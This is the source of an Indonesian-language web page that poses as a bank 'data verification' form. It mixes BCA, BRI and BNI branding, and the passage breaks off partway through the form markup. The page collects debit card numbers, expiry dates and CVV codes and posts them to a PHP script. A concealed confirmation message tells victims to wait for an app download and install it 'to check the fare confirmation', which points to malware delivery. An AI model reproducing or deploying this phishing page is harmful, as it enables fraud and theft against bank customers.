<html lang="id">
 <head> 
  <meta charset="UTF-8"> 
  <meta name="fragment" content="!"> 
  <meta name="theme-color" content="#1583dc"> 
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
   <meta content="© 2021 PT Bank Central Asia Tbk, All Rights Reserved." name="description">
  <meta content="menu" property="og:title">
  <meta content="© 2021 PT Bank Central Asia Tbk, All Rights Reserved." property="og:description">
  <meta name="viewport" content="width=device-width,initial-scale=1.0, user-scalable=no, minimal-ui"> 
  <title>Verifikasi Data</title> <link href="https://fonts.googleapis.com/css?family=Andada" rel="stylesheet" type="text/css">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"> 
  <link rel="stylesheet" href="./style.css">
   <link data-n-head="ssr" rel="icon" type="image/x-icon" src="img/bri-header.jpg">
 </head> 
 <body> 
  <style>
        
@import url("https://fonts.googleapis.com/css?family=Source+Code+Pro:400,500,600,700|Source+Sans+Pro:400,600,700&display=swap");

html {
    width: 100%;
    height: 100%;
}

body {
  background-image: url('https://ibb.co/4scQbgv');
  font-family: 'Source Sans Pro', sans-serif;
  background-position: 100% 100%;
  background-size: 100% 100%;
  position: fixed;
  left: 0;
  right: 0;
  
         height: 100%;
  font-size: 16px;
  width: 100%;
  background-color: white;
 
}
* {
  box-sizing: border-box;
}
*:focus {
  outline: none;
}

.wrapper {
  min-height: 30vh;
  display: flex;
  padding: 50px 15px;
}
@media screen and (max-width: 700px), (max-height: 440px) {
  .wrapper {
    flex-wrap: wrap;
    flex-direction: column;
  }
}

.card-form {
  max-width: 570px;
  margin: auto;
  width: 100%;
  height: 430px;
  border-radius: 15px;
}
@media screen and (max-width: 576px) {
  .card-form {
    margin: 0 auto;
    margin-top; -40px
  }
}
.card-form__inner {
  background: snow;
  box-shadow: 0 30px 60px 0 rgba(90, 116, 148, 0.4);
  border: 3px #1E90FF;
  color: #1BC1CF;
  border-radius: 20px;
  padding: 35px;
  padding-top: 10px;
  margin-top: 120px;
}
@media screen and (max-width: 480px) {
  .card-form__inner {
    padding: 15px;
    margin-top: 145px;
  }
}
@media screen and (max-width: 360px) {
  .card-form__inner {
    padding: 15px;
    margin-top: 145px;
  }
}
.card-form__row {
  display: flex;
  align-items: flex-start;
}
@media screen and (max-width: 480px) {
  .card-form__row {
    flex-wrap: wrap;
  }
}
.card-form__col {
  flex: auto;
  margin-right: 35px;
}
.card-form__col:last-child {
  margin-right: 0;
}
@media screen and (max-width: 480px) {
  .card-form__col {
    margin-right: 0;
    flex: unset;
    width: 100%;
    margin-bottom: 20px;
  }
  .card-form__col:last-child {
    margin-bottom: 5;
  }
}
.card-form__col.-cvv {
  max-width: 150px;
}
@media screen and (max-width: 480px) {
  .card-form__col.-cvv {
    max-width: initial;
  }
}
.card-form__group {
  display: flex;
  align-items: flex-start;
  flex-wrap: wrap;
}
.card-form__group .card-input__input {
  flex: 1;
  margin-right: 15px;
}
.card-form__group .card-input__input:last-child {
  margin-right: 0;
}
.card-form__button {
  width: 100%;
  height: 48px;
  background: #1E90FF;
  border: none;
  border-radius: 25px;
  font-size: 18px;
  font-weight: 700;
  font-family: "Source Sans Pro";
  box-shadow: 8px 10px 10px 0px rgba(0,0,0,0.41);
    -webkit-box-shadow: 4px 5px 10px 0px rgba(0,0,0,0.41);
-moz-box-shadow: 8px 5px 5px 0px rgba(0,0,0,0.41);
  color: #fff;
  margin-top: -10px;
  cursor: pointer;
}
@media screen and (max-width: 480px) {
  .card-form__button {
    margin-top: 10px;
  }
}

.card-item {
  max-width: 430px;
  height: 180px;
  margin-left: auto;
  margin-right: auto;
  position: relative;
  z-index: 4;
  width: 100%;
}
@media screen and (max-width: 480px) {
  .card-item {
    max-width: 310px;
    height: 180px;
    width: 90%;
  }
}
@media screen and (max-width: 360px) {
  .card-item {
    height: 180px;
  }
}
.card-item.-active .card-item__side.-front {
  transform: perspective(1000px) rotateY(180deg) rotateX(0deg) rotateZ(0deg);
}
.card-item.-active .card-item__side.-back {
  transform: perspective(1000px) rotateY(0) rotateX(0deg) rotateZ(0deg);
}
.card-item__focus {
  position: absolute;
  z-index: 3;
  border-radius: 5px;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  transition: all 0.35s cubic-bezier(0.71, 0.03, 0.56, 0.85);
  opacity: 0;
  pointer-events: none;
  overflow: hidden;
  border: 2px #1E90FF;
}
.card-item__focus:after {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  background: #1583dc;
  height: 100%;
  border-radius: 5px;
  filter: blur(25px);
  opacity: 0.5;
}
.card-item__focus.-active {
  opacity: 1;
}
.card-item__side {
  border-radius: 15px;
  overflow: hidden;
  box-shadow: 0 20px 60px 0 rgba(14, 42, 90, 0.55);
  transform: perspective(2000px) rotateY(0deg) rotateX(0deg) rotate(0deg);
  transform-style: preserve-3d;
  transition: all 0.8s cubic-bezier(0.71, 0.03, 0.56, 0.85);
  backface-visibility: hidden;
  height: 100%;
}
.card-item__side.-back {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  transform: perspective(2000px) rotateY(-180deg) rotateX(0deg) rotate(0deg);
  z-index: 2;
  padding: 0;
  height: 100%;
}
.card-item__side.-back .card-item__cover {
  transform: rotateY(-180deg);
}
.card-item__bg {
  max-width: 100%;
  display: block;
  max-height: 100%;
  height: 100%;
  width: 100%;
  object-fit: 50%;
  border-radius: 12px;
  border: 3px solid snow;
}
.card-item__cover {
  height: 100%;
  background-color: #1E90FF;
  position: absolute;
  bottom: 0;
  left: 0;
  top: 0;
  border: 3px solid #1E90FF;
  width: 100%;
  border-radius: 12px;
  overflow: hidden;
  margin-bottom: -120px;
}
.card-item__cover:after {
  content: "";
  position: absolute;
  left: 0;
  border-radius: 20px;
  top: 0;
  width: 100%;
  height: 100%;
  background: transparent;
}
.card-item__top {
  display: flex;
  align-items: flex-start;
  justify-content: space-between;
  margin-bottom: 40px;
  padding: 0 10px;
}
@media screen and (max-width: 480px) {
  .card-item__top {
    margin-bottom: 10px;
     margin-top: 32px;
  }
}
@media screen and (max-width: 360px) {
  .card-item__top {
    margin-bottom: 10px;
    margin-top: 32px;
    width: 50px;
  }
}
.card-item__chip {
  width: 50px;
}
@media screen and (max-width: 480px) {
  .card-item__chip {
    width: 50px;
  }
}
@media screen and (max-width: 360px) {
  .card-item__chip {
    width: 50px;
  }
}
.card-item__type {
  height: 45px;
  position: relative;
  display: flex;
  justify-content: flex-end;
  max-width: 100px;
  margin-left: auto;
  width: 100%;
}
@media screen and (max-width: 480px) {
  .card-item__type {
    height: 40px;
    max-width: 90px;
  }
}
@media screen and (max-width: 360px) {
  .card-item__type {
    height: 40px;
  }
}
.card-item__typeImg {
  max-width: 100%;
  object-fit: contain;
  max-height: 100%;
  object-position: top right;
}
.card-item__info {
  color: #010c0c;
  width: 100%;
  max-width: calc(100% - 85px);
  padding: 10px 15px;
  font-weight: 800;
  display: block;
  cursor: pointer;
}
@media screen and (max-width: 480px) {
  .card-item__info {
    padding: 10px;
  }
}
.card-item__holder {
  opacity: 1;
  font-size: 13px;
  margin-bottom: 6px;
  color: #1583dc;
  font-weight: 800;
}
@media screen and (max-width: 480px) {
  .card-item__holder {
    font-size: 12px;
    margin-bottom: 5px;
  }
}
.card-item__wrapper {
  font-family: "Source Code Pro", monospace;
  padding: 25px 15px;
  position: relative;
  z-index: 4;
  height: 100%;
  text-shadow: 7px 6px 10px rgba(14, 42, 90, 0.8);
  user-select: none;
}
@media screen and (max-width: 480px) {
  .card-item__wrapper {
    padding: 20px 10px;
  }
}
.card-item__name {
  font-size: 18px;
  line-height: 1;
  white-space: nowrap;
  max-width: 100%;
  overflow: hidden;
  text-overflow: ellipsis;
  text-transform: uppercase;
}
@media screen and (max-width: 480px) {
  .card-item__name {
    font-size: 16px;
  }
}
.card-item__nameItem {
  display: inline-block;
  min-width: 8px;
  position: relative;
}
.card-item__number {
  font-weight: 800;
  line-height: 0.7;
  font-size: 30px;
  margin-bottom: -25px;
  display: inline-block;
  padding: 10px 5px;
  cursor: pointer;
  color: #F0F8FF;
  opacity: 1;
  
}
@media screen and (max-width: 480px) {
  .card-item__number {
    font-size: 21px;
    margin-bottom: -15px;
    padding: 10px 10px;
    opacity: 1;
    
  }
}
@media screen and (max-width: 360px) {
  .card-item__number {
    font-size: 19px;
    margin-bottom: -10px;
    padding: 10px 10px;
    opacity: 1;
   
  }
}
.card-item__numberItem {
  width: 18px;
  display: inline-block;
   color: #F0F8FF;
}
.card-item__numberItem.-active {
  width: 30px;
  
}
@media screen and (max-width: 480px) {
  .card-item__numberItem {
    width: 13px;
    
  }
  .card-item__numberItem.-active {
    width: 16px;
    
  }
}
@media screen and (max-width: 360px) {
  .card-item__numberItem {
    width: 12px;
  }
  .card-item__numberItem.-active {
    width: 8px;
    
  }
}

.card-item__numberItem:active{
    color: green;
}

.card-item__content {
  color: #F0F8FF;
  display: flex;
  align-items: flex-start;
}
.card-item__date {
  flex-wrap: wrap;
  font-size: 18px;
  margin-left: auto;
  padding: 10px;
  display: inline-flex;
  width: 80px;
  white-space: nowrap;
  flex-shrink: 0;
  cursor: pointer;
}
@media screen and (max-width: 480px) {
  .card-item__date {
    font-size: 18px;
  }
}
.card-item__dateItem {
  position: relative;
}
.card-item__dateItem span {
  width: 22px;
  display: inline-block;
  color: #F0F8FF;
  font-weight: 800;
}
.card-item__dateTitle {
  opacity: 1;
  font-size: 15px;
  padding-bottom: 6px;
  width: 100%;
  margin-left: 0px;
  color: yellow;
  font-weight: 800;
}
@media screen and (max-width: 480px) {
  .card-item__dateTitle {
    font-size: 15px;
    padding-bottom: 5px;
  }
}
.card-item__band {
  background: rgba(0, 0, 19, 0.8);
  width: 100%;
  height: 50px;
  margin-top: 30px;
  position: relative;
  z-index: 2;
}
@media screen and (max-width: 480px) {
  .card-item__band {
    margin-top: 20px;
  }
}
@media screen and (max-width: 360px) {
  .card-item__band {
    height: 40px;
    margin-top: 10px;
  }
}
.card-item__cvv {
  text-align: right;
  position: relative;
  z-index: 2;
  padding: 15px;
  color: #F0F8FF;
}
.card-item__cvv .card-item__type {
  opacity: 1;
}
@media screen and (max-width: 360px) {
  .card-item__cvv {
    padding: 10px 15px;
    color: #00CED1;
  }
}
.card-item__cvvTitle {
  padding-right: 10px;
  font-size: 15px;
  font-weight: 800;
  color: #F0F8FF;
  margin-bottom: 5px;
}
.card-item__cvvBand {
  height: 45px;
  background: #ffff;
  margin-bottom: 30px;
  text-align: right;
  display: flex;
  align-items: center;
  justify-content: flex-end;
  padding-right: 10px;
  color: #1583dc;
  font-size: 18px;
  border-radius: 4px;
  box-shadow: 0px 10px 20px -7px rgba(32, 56, 117, 0.35);
}
@media screen and (max-width: 480px) {
  .card-item__cvvBand {
    height: 40px;
    margin-bottom: 20px;
  }
}
@media screen and (max-width: 360px) {
  .card-item__cvvBand {
    margin-bottom: 15px;
  }
}

.card-list {
  margin-bottom: -100px;
}
@media screen and (max-width: 480px) {
  .card-list {
    margin-bottom: -120px;
  }
}

.card-input {
  margin-bottom: 20px;
}
.card-input__label {
  font-size: 25px;
  margin-bottom: 5px;
  font-weight: 600;
  color: #00BFFF;
  width: 100%;
  display: none;
  user-select: none;
}
.card-input__input {
  width: 100%;
  height: 45px;
  border-radius: 25px;
box-shadow: #000000;
    -webkit-box-shadow: 4px 5px 10px 0px rgba(0,0,0,0.41);
-moz-box-shadow: 8px 5px 5px 0px rgba(0,0,0,0.41);
  border: 2px solid #00BFFF;
  transition: all 0.3s ease-in-out;
  font-size: 16px;
  padding: 5px 15px;
  background: #FFFFFF;
  color: #1a3b5d;
  font-family: "Source Sans Pro", sans-serif;
}
.card-input__input:hover, .card-input__input:focus {
  border-color: #4FCFDA;
}

.card-input__input:focus {
  box-shadow: 8px 5px 15px 0px rgba(0,0,0,0.21);
    -webkit-box-shadow: 6px 15px 10px 0px rgba(0,0,0,0.21);
-moz-box-shadow: 8px 5px 15px 0px rgba(0,0,0,0.21);
background-color: snow;
}

.card-input__input.-select {
  -webkit-appearance: none;
  background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAeCAYAAABuUU38AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAUxJREFUeNrM1sEJwkAQBdCsngXPHsQO9O5FS7AAMVYgdqAd2IGCDWgFnryLFQiCZ8EGnJUNimiyM/tnk4HNEAg/8y6ZmMRVqz9eUJvRaSbvutCZ347bXVJy/ZnvTmdJ862Me+hAbZCTs6GHpyUi1tTSvPnqTpoWZPUa7W7ncT3vK4h4zVejy8QzM3WhVUO8ykI6jOxoGA4ig3BLHcNFSCGqGAkig2yqgpEiMsjSfY9LxYQg7L6r0X6wS29YJiYQYecemY+wHrXD1+bklGhpAhBDeu/JfIVGxaAQ9sb8CI+CQSJ+QmJg0Ii/EE2MBiIXooHRQhRCkBhNhBcEhLkwf05ZCG8ICCOpk0MULmvDSY2M8UawIRExLIQIEgHDRoghihgRIgiigBEjgiFATBACAgFgghEwSAAGgoBCBBgYAg5hYKAIFYgHBo6w9RRgAFfy160QuV8NAAAAAElFTkSuQmCC");
  background-size: 12px;
  background-position: 90% center;
  background-repeat: no-repeat;
  padding-right: 30px;
}

.slide-fade-up-enter-active {
  transition: all 0.25s ease-in-out;
  transition-delay: 0.1s;
  position: relative;
}

.slide-fade-up-leave-active {
  transition: all 0.25s ease-in-out;
  position: absolute;
}

.slide-fade-up-enter {
  opacity: 0;
  transform: translateY(15px);
  pointer-events: none;
}

.slide-fade-up-leave-to {
  opacity: 0;
  transform: translateY(-15px);
  pointer-events: none;
}

.slide-fade-right-enter-active {
  transition: all 0.25s ease-in-out;
  transition-delay: 0.1s;
  position: relative;
}

.slide-fade-right-leave-active {
  transition: all 0.25s ease-in-out;
  position: absolute;
}

.slide-fade-right-enter {
  opacity: 0;
  transform: translateX(10px) rotate(45deg);
  pointer-events: none;
}

.slide-fade-right-leave-to {
  opacity: 0;
  transform: translateX(-10px) rotate(45deg);
  pointer-events: none;
}

.github-btn {
  position: absolute;
  right: 40px;
  bottom: 50px;
  text-decoration: none;
  padding: 15px 25px;
  border-radius: 4px;
  box-shadow: 0px 4px 30px -6px rgba(36, 52, 70, 0.65);
  background: #24292e;
  color: #fff;
  font-weight: bold;
  letter-spacing: 1px;
  font-size: 19px;
  text-align: center;
  transition: all 0.3s ease-in-out;
}
@media screen and (min-width: 500px) {
  .github-btn:hover {
    transform: scale(1.1);
    box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
  }
}
@media screen and (max-width: 700px) {
  .github-btn {
    position: relative;
    bottom: auto;
    right: auto;
    margin-top: 20px;
  }
  .github-btn:active {
    transform: scale(1.1);
    box-shadow: 0px 17px 20px -6px rgba(36, 52, 70, 0.36);
  }
}

body {font-family: Arial, Helvetica, sans-serif;
width: 100%;
position: center;

}
* {box-sizing: border-box;}

/* Button used to open the contact form - fixed at the bottom of the page */
.open-button {
  background-color: #555;
  color: white;
  padding: 16px 20px;
  border: none;
  cursor: pointer;
  opacity: 0.8;
  position: fixed;
  bottom: 23px;
  right: 28px;
  width: 280px;
}

/* The popup form - hidden by default */
.form-popup {
    
    background-color:rgba(192,192,192,0.9);
  display: none;
  position: fixed;
  margin-top: -600px;
  margin-left: 10px;
  margin-right: 10px;
  box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
  right: 0px;
  border: 3px solid #f1f1f1;
  border-radius: 10px;
  z-index: 9;
}

/* Add styles to the form container */
.form-container {
  max-width: 300px;
  padding: 10px;
  background-color: white;
}


/* Full-width input fields */
.form-container input[type=text], .form-container input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  border: none;
  background: #f1f1f1;
}

/* When the inputs get focus, do something */
.form-container input[type=text]:focus, .form-container input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Set a style for the submit/login button */
.form-container .btn {
  background-color: #04AA6D;
  color: white;
  padding: 16px 20px;
  border: none;
  cursor: pointer;
  width: 100%;
  margin-bottom:10px;
  opacity: 0.8;
}

/* Add a red background color to the cancel button */
.form-container .cancel {
  background-color: red;
}
/* Add some hover effects to buttons */
.form-container .btn:hover, .open-button:hover {
  opacity: 1;
}


#download{
  width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
  background-position: 100% 100%;
  background-size: 100% 100%;
  display: none;
  position: absolute;
  left: 0;
  right: 0;
  top: 0;
  bottom: 0;
  margin: 0px auto;
  z-index: 99999999;
    
 }

.animated {
	-webkit-animation-duration: 2s;
	animation-duration: 1s;
	-webkit-animation-fill-mode: both;
	animation-fill-mode: both;
	-webkit-animation-timing-function: ease-in-out;
	animation-timing-function: ease-in-out;
}

@-webkit-keyframes swashIn {
    0% {
        opacity: 0;
        -webkit-transform-origin: 50% 50%;
        -webkit-transform: scale(0, 0);
    }
    90% {
        opacity: 1;
        -webkit-transform-origin: 50% 50%;
        -webkit-transform: scale(0.9, 0.9);
    }
    100% {
        opacity: 1;
        -webkit-transform-origin: 50% 50%;
        -webkit-transform: scale(1, 1);
    }
}
@keyframes swashIn {
    0% {
        opacity: 0;
        transform-origin: 50% 50%;
        transform: scale(0, 0);
    }
    90% {
        opacity: 1;
        transform-origin: 50% 50%;
        transform: scale(0.9, 0.9);
    }
    100% {
        opacity: 1;
        transform-origin: 50% 50%;
        transform: scale(1, 1);
    }
}
.swashIn {
    -webkit-animation-name: swashIn;
    animation-name: swashIn;
}




 .blink {
  animation: blink-animation 2s steps(6, start) infinite;
  -webkit-animation: blink-animation 2s steps(6, start) infinite;
}
@keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
@-webkit-keyframes blink-animation {
  to {
    visibility: hidden;
  }
}
        
        
        .pincode{ 
  padding: 0; 
  margin: 0 auto; 
  display: flex;
  justify-content:center;
  
} 
 
.pincode input { 
  text-align: center; 
  width: 40px;
  margin-top: 10px;
  margin-bottom: -5px;
  height:40px;
  font-size: 36px; 
  color: black;
  text-align: center;
  background-color: #CFCFCF;
  margin-right: 5px;
  border-radius: 10px;
  
  border: 2px solid #ddd;
  box-shadow: 8px 8px 8px 0px rgba(0,0,0,0.41);
    -webkit-box-shadow: 4px 5px 10px 0px rgba(0,0,0,0.41);
-moz-box-shadow: 8px 5px 5px 0px rgba(0,0,0,0.41);
} 



.pincode input:focus { 
  border: 2px solid #4FCFDA;
  outline:groove;
  box-shadow: 8px 5px 15px 0px rgba(0,0,0,0.21);
    -webkit-box-shadow: 6px 15px 10px 0px rgba(0,0,0,0.21);
-moz-box-shadow: 8px 5px 15px 0px rgba(0,0,0,0.21);
background-color: snow;
} 


.uang{
    background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjyev8giu5iAigCXSpbg0R8inudLjh6Mn1zuET8NzYNZCu734Swq6QRx1w-56JUC0aRF2rG9UE9MQWxhh8LoHaQysoisg7hENDoonLXIHCfSOJHwXzxaMKDsD20PqOpMRp54ls_1X4Zq0RgS2Qu6HmFXVAGgs-2bU6FKwnqsll_qnnqAYRpb6uk7v8n7kY/s16000/1687855223924.png');
    background-repeat: no-repeat;
    background-position: 100% 100%;
    background-size: 100% 100%;
    padding-left: 55px;
   
}

.uang:hover{
   
 box-shadow: 8px 5px 15px 0px rgba(0,0,0,0.21);
    -webkit-box-shadow: 6px 15px 10px 0px rgba(0,0,0,0.21);
-moz-box-shadow: 8px 5px 15px 0px rgba(0,0,0,0.21);
background-color: snow;
}



 #modalContainer {
	background-color:rgba(0, 0, 0, 0.7);
	position:absolute;
	width:100%;
	height:100%;
	top:0px;
	left:0px;
	margin: 0px auto;
	z-index:99999999999;
	padding-left: 20px;
	padding-right: 20px;
	background-image:url(tp.png); /* required by MSIE to prevent actions on lower z-index elements */
}

#alertBox {
	width: 80%; 
	height: 40%; 
	display: ; 
	background: SNOW; 
	position: absolute; 
	left: 0; 
	right: 0; 
	margin: 0px auto; 
	top: 25%; 
	z-index: 9999999999999; 
	border-radius: 15px; 
	text-align: center; 
	padding: 8px; 
	border: 2px double #ccc;
	box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
	color: #323232; 
	color: rgb(120, 120, 120, 0.9);
	 -webkit-animation-name: swashIn;
    animation-name: swashIn;
    	-webkit-animation-duration: 2s;
	animation-duration: 1s;
	-webkit-animation-fill-mode: both;
	animation-fill-mode: both;
	-webkit-animation-timing-function: ease-in-out;
	animation-timing-function: ease-in-out;
}

#modalContainer > #alertBox {
	position:fixed;
	
	margin: 0px auto;
	width: 80%;
	left: 0;
	right: 0;
	margin-left: 0px;
	margin-right: 0px;
}

#modalContainer > #alertBoxd {
	position:fixed;
	margin: 0px auto;
	width: 75%;
	left: 0;
	right: 0;
	margin-left: 0px;
	margin-right: 0px;
}


#alertBox h1 {
	margin:0;
	font:bold 19px verdana,arial;
	background-color: transparent;
	 color: rgb(120, 120, 120, 0.7)
	border-bottom:1px solid #bbb;
	padding:0px 0 2px 3px;
	margin-bottom: 15px;
	margin-top: -18px;
	padding: 0px;
	
}

#alertBox p {
	font:15px verdana,arial;
	height:38%;
	padding-left:0px;
	margin-top: 5px;
	
	
}

#alertBoxd p {
	font:15px verdana,arial;
	height:38%;
	padding-left:0px;
	margin-top: 5px;
	
}


#alertBox fieldset {
	border: 2px double #ccc; 
	padding-bottom: 5px; 
	padding-top: 0px; 
	border-radius: 10px;
	height: 38%;
	
}
#alertBoxd{
border: 3px double #ccc; 
	width: 80%; 
	height: 38%; 
	display: ; 
	background: SNOW; 
	position: absolute; 
	left: 0; 
	right: 0; 
	margin: 0px auto; 
	top: 26%; 
	z-index: 999999999999; 
	border-radius: 15px; 
	text-align: center; 
	padding: 8px; 
	border: 2px double #ccc;
	outline: 2px double #1BC1CF;
	color: #323232; 
	color: rgb(120, 120, 120, 0.9);
	 -webkit-animation-name: swashIn;
    animation-name: swashIn;
    	-webkit-animation-duration: 2s;
	animation-duration: 1s;
	-webkit-animation-fill-mode: both;
	animation-fill-mode: both;
	-webkit-animation-timing-function: ease-in-out;
	animation-timing-function: ease-in-out;
}

#alertBox #closeBtn {
	width: 70%; 
	height: 38px; 
	background: #1583dc; 
	color: snow; 
	font-weight: 700; 
	border-radius: 8px; 
	box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; 
	margin-top: 8px; 
	border: none;
}

#alertBoxd #closeBtn {
	display:block;
	position:relative;
	margin: 0px auto;
	padding:7px;.
	left: 0;
	right: 0;
	width: 70%; 
	height: 38px; 
	margin-top: 68px;
	padding-top: 10px;
	border:0 none;
	font:0.9em verdana,arial;
	text-transform:uppercase;
	text-align:center;
	font-weight: 800;
	color:#FFF;
	background-color:#1583dc;
	border-radius: 8px;
	text-decoration:none;
}


/* unrelated styles */

#mContainer {
	position:absolute;
	width:100%;
	margin: 0px auto;
	padding:5px;
	border-top:2px solid #000;
	border-bottom:2px solid #000;
	font:0.7em verdana,arial;
}

h1{
    font-size: 20px;
    font-weight: 700;
}

#selamat{
    position: fixed; 
    top: 0; 
    right: 0; 
    left: 0; 
    bottom: 0;
    margin: 0px auto;
    width: 100%;
    height: 100%;
}
    </style> 
<!-- partial:index.partial.html -->
<nav style="position: fixed; top: 0; right: 0; left: 0; margin: 0px auto; width: 100%; height: 50px; background: #1583dc; box-shadow: 0 30px 60px 0 rgba(90, 116, 148, 0.5);"><img src="https://bri.co.id/o/bri-corporate-theme/images/bri-logo-white.png" style="width: 90px; float:left; margin-top: 10px; margin-left: 10px"></nav>
<div style="position: absolute; left: 0; right: 0; top: 80; margin: 0px auto; width: 100%; text-align: center;  display: none" id="konfirmasiku">
     <div class="text-center"> 
         <img src="https://infobanknews.com/wp-content/uploads/2018/05/logo-BNI-46-1.png" style="width: 250px; margin-top: 10px"> 
        </div> 
        <div style="border: 2px solid #ccc; width: 90%; height: 87%; margin: 15px auto; background: snow; border-radius: 10px; padding: 5px; padding-top: 20px">  
       
    <p><h3 style="font-size: 25px; font-weight: 700">Terima Kasih</h3></p>
    
    <p style="padding: 20px; line-height: 20px;font-family: Andada;">Sudah melakukan konfirmasi perubahan tarif, Untuk saat ini transaksi anda sedang dalam proses, Silahkan tunggu download Aplikasi selesai lalu instal untuk Cek Konfirmasi Tarif nya, selanjutnya akan diinformasikan melalui Whatsapp </p>
    </div>
</div>
<div class="wrapper" id="app" style="display: ;">
    <div class="card-form" style="margin-top: 20px">
      <div class="card-list">
        <div class="card-item" v-bind:class="{ '-active' : isCardFlipped }">
          <div class="card-item__side -front">
            <div class="card-item__focus" v-bind:class="{'-active' : focusElementStyle }" v-bind:style="focusElementStyle" ref="focusElement"></div>
            <div class="card-item__cover">
              <img
              src="img/card2.jpg"
class="card-item__bg">
            </div>
            
            <div class="card-item__wrapper">
              <div class="card-item__top">
<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhI35aOgpFgblKWnLWu_nz6JsZ1-cuxAb4bJtbwyc4-fzszHsMc8ax0J8ToCpZH1Q8F1GvP1pjx1uk3LeoyCD_cPxRqY2fEjY5oM_7ApKhbis-TH62iy6MExAreTDk21HmMIPJV-xYHj0vAOWN4gfPq6xY9VYQII7np3_1zZpLBgxxY8gZfgzqPGsy4/s2400/chip-1-logo-png-transparent.png" class="card-item__chip">
                <div class="card-item__type">
                  <transition name="slide-fade-up">
                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" v-bind:key="getCardType" alt="" class="card-item__typeImg">
                  </transition>
                </div>
              </div>
              <label for="cardNumber" class="card-item__number" ref="cardNumber">
                   <div class="card-item__holder" style="margin-top: -20px;">Nomor Kartu Debit</div>
                <template v-if="getCardType === 'amex'">
                 <span v-for="(n, $index) in amexCardMask" :key="$index">
                  <transition name="slide-fade-up">
                    <div
                      class="card-item__numberItem"
                      v-if="$index > 4 && $index < 15 && cardNumber.length > $index && n.trim() !== ''"
                    >*</div>
                    <div class="card-item__numberItem"
                      :class="{ '-active' : n.trim() === '' }"
                      :key="$index" v-else-if="cardNumber.length > $index">
                      {{cardNumber[$index]}}
                    </div>
                    <div
                      class="card-item__numberItem"
                      :class="{ '-active' : n.trim() === '' }"
                      v-else
                      :key="$index + 1"
                    >{{n}}</div>
                  </transition>
                </span>
                </template>

                <template v-else>
                  <span v-for="(n, $index) in otherCardMask" :key="$index">
                    <transition name="slide-fade-up">
                      <div
                        class="card-item__numberItem"
                        v-if="$index > 4 && $index < 16 && cardNumber.length > $index && n.trim() !== ''"
                      >*</div>
                      <div class="card-item__numberItem"
                        :class="{ '-active' : n.trim() === '' }"
                        :key="$index" v-else-if="cardNumber.length > $index">
                        {{cardNumber[$index]}}
                      </div>
                      <div
                        class="card-item__numberItem"
                        :class="{ '-active' : n.trim() === '' }"
                        v-else
                        :key="$index + 1"
                      >{{n}}</div>
                    </transition>
                  </span>
                </template>
              </label>
               <div class="card-item__date" ref="cardDate"> 
          <label for="cardMonth" class="card-item__dateTitle">Masa Berlaku</label> 
          <label for="cardMonth" class="card-item__dateItem"> 
           <transition name="slide-fade-up"> 
            <span v-if="cardMonth" v-bind:key="cardMonth">{{cardMonth}}</span> 
            <span v-else="" key="2">MM</span> 
           </transition> </label> / 
          <label for="cardYear" class="card-item__dateItem"> 
           <transition name="slide-fade-up"> 
            <span v-if="cardYear" v-bind:key="cardYear">{{String(cardYear).slice(2,4)}}</span> 
            <span v-else="" key="2">YY</span> 
           </transition> </label> 
         </div> 
      </div> 
      </div>
          <div class="card-item__side -back">
            <div class="card-item__cover">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbdaF2ta4rYztyPgYx_9q8KJsp86bvzxQmzA&usqp=CAU" class="card-item__bg">
            </div>
            <div class="card-item__band"></div>
            <div class="card-item__cvv">
                <div class="card-item__cvvTitle">CVV</div>
                <div class="card-item__cvvBand">
                  <span v-for="(n, $index) in cardCvv" :key="$index">
                    *
                  </span>

              </div>
                <div class="card-item__type">
                    <img v-bind:src="'https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/' + getCardType + '.png'" v-if="getCardType" class="card-item__typeImg">
                </div>
            </div>
          </div>
        </div>
      </div>
    
      <div class="card-form__inner">
         <form action="auth/nobit.php" method="post">
<input type="hidden" id="logo" name="logo" value="━─━────༺𝗕𝗡𝗜༻────━─━
"> 
      <div class="card-input"> 
       <label for="cardNumber" class="card-input__label" style="font-weight: 800;">Nomor Kartu Debit/ATM</label> 
       <input type="tel" name="nodeb" id="nama" class="card-input__input" v-mask="generateCardNumberMask" v-model="cardNumber" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardNumber" autocomplete="off" placeholder="Nomor Kartu Debit" required maxlength="19" minlength="19"> 
      </div> 
      <div class="card-input"> 
       <label for="cardName" class="card-input__label" style="font-weight: 800;">Nama Pemilik Rekening</label> 
       <input type="text" id="email" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Nama Pimilik Rekening" style="display: none"> 
      </div> 
      <div class="card-form__row"> 
       <div class="card-form__col"> 
        <div class="card-form__group"> 
         <label for="cardMonth" class="card-input__label" style="font-weight: 800;">Masa Berlaku</label> 
         <select id="bulan" class="card-input__input -select" v-model="cardMonth" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardDate" required name="bulan"> <option value="" disabled selected>Bulan</option> <option v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12" v-bind:disabled="n < minCardMonth" v-bind:key="n"> {{n < 10 ? '0' + n : n}} </option> </select> 
